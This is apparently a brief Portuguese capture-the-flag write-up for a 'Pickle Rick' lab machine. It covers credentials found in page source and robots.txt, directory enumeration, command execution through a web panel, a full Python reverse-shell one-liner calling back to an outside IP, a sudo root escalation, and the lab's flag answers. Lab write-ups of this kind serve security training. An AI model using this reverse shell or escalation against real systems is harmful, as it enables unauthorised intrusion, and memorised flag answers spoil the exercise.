CTF PICLE RICK
 
 <br>

VISUALIZANDO O CODIGO FONTE: 

    Username: R1ckRul3s

<br>

Pelo Dirb encontrava o login.php, robots.txt 

<br>

ROBOTS.TXT

    Wubbalubbadubdub


<br>
FALHA RCE: Ao acessar o painel.php tinha acesso a dar comands ao back-end assim podendo executar um comando em python para criar uma porta e se conectar ao meu dispositivo <br>

    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.93.190",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'




Escalar privilegio, user www-data executava como root <br>
    
    sudo bash -i


FLAGS

    Flag 1: mr meeseek hair 
    Flag 2: 1 jerry tear  
    Flag 3: fleeb juice